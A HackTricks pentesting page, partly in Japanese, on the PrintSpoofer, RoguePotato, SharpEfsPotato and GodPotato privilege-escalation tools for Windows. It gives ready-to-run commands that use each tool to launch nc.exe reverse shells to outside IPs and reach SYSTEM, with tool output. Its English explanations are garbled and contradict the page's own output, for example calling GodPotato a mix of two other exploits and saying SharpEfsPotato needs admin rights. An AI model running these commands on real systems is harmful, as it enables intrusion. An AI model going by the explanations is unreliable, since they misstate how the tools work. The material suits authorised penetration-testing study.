# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **hacktricksリポジトリ**と**hacktricks-cloudリポジトリ**にPRを提出して、あなたのハッキングトリックを共有してください。

</details>

{% hint style="warning" %}
**JuicyPotatoは**Windows Server 2019およびWindows 10ビルド1809以降では動作しません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)を使用して、同じ特権を利用し、`NT AUTHORITY\SYSTEM`レベルのアクセスを取得することができます。この[ブログ記事](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)では、JuicyPotatoが動作しないWindows 10およびServer 2019ホストで、`PrintSpoofer`ツールを使用して偽装特権を悪用する方法について詳しく説明しています。
{% endhint %}

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
RoguePotato is a Windows local privilege escalation technique that takes advantage of the Windows COM Server and DCOM features. It allows an attacker to escalate their privileges from a low-privileged user to SYSTEM level. 

The technique involves creating a malicious COM object that triggers the execution of a specified binary with SYSTEM privileges. This can be achieved by exploiting the "Local Activation" permission of the COM object. 

To perform a RoguePotato attack, the attacker needs to have the ability to create a COM object on the target system. This can be done by leveraging existing permissions or by exploiting vulnerabilities in the system. 

Once the COM object is created, the attacker can use various methods to trigger its execution, such as using the "DCOM LRPC" protocol or by exploiting specific applications that use COM objects. 

RoguePotato is a powerful technique that can bypass many security measures, including User Account Control (UAC) and AppLocker. It is important for system administrators to be aware of this technique and take appropriate measures to mitigate the risk.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
### SharpEfsPotato

SharpEfsPotato is a tool that leverages the EfsRpcOpenFileRaw function to perform a Local Privilege Escalation (LPE) attack on Windows systems. This attack takes advantage of the EFS (Encrypting File System) service, which allows users to encrypt files and folders on their system.

By exploiting a misconfiguration in the EFS service, an attacker can escalate their privileges from a low-privileged user to SYSTEM level. This can be particularly useful in scenarios where the attacker has limited access to the system but wants to gain full control.

To use SharpEfsPotato, you need to provide the target system's IP address and the name of a writable directory on the target system. The tool will then create a malicious DLL file in the specified directory. When the EFS service tries to access this file, it will execute the DLL with SYSTEM privileges, allowing the attacker to execute arbitrary code.

It's important to note that SharpEfsPotato requires administrative privileges to run successfully. Additionally, this attack technique has been patched in newer versions of Windows, so it may not work on fully updated systems. However, it can still be effective on older or unpatched systems.

To mitigate the risk of this attack, it is recommended to keep your Windows systems up to date with the latest security patches and configurations. Regularly monitoring and reviewing system logs can also help detect any suspicious activity related to EFS or privilege escalation attempts.
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a technique that combines the RoguePotato and PrintSpoofer exploits to achieve local privilege escalation on Windows systems. This technique takes advantage of the Windows Print Spooler service and its ability to load arbitrary DLL files.

To execute the GodPotato attack, follow these steps:

1. Download the RoguePotato and PrintSpoofer exploits from their respective sources.
2. Compile the RoguePotato exploit and generate a DLL payload.
3. Transfer the RoguePotato DLL payload to the target Windows system.
4. Execute the PrintSpoofer exploit to gain SYSTEM-level privileges.
5. Use the RoguePotato DLL payload to execute arbitrary commands with elevated privileges.

By combining these two exploits, an attacker can escalate their privileges on a Windows system and gain full control over the target machine. It is important to note that this technique should only be used for ethical purposes, such as penetration testing or security research.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
